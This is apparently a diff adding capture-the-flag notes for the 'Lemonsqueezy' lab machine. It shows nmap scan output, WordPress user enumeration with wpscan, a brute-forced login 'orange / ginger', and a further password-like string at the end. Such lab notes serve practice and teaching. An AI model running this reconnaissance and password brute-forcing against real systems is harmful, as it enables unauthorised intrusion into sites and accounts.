@@ -1,0 +1,39 @@
+hack@kali:~$ nmap -sC -sV -p- 192.168.1.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 20:48 CEST
+Nmap scan report for lemonsqueezy.homenet.telecomitalia.it (192.168.1.13)
+Host is up (0.00084s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds
+
+
+hack@kali:~/CTF/Lemonqueezy$ wpscan --url 192.168.1.13/wordpress -e u
+
+[i] User(s) Identified:
+
+[+] lemon
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] orange
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+Bruteforce: 
+[SUCCESS] - orange / ginger 
+
+Users:
+orange:ginger
+
+
+
+
+n0t1n@w0rdl1st!
+
+
+
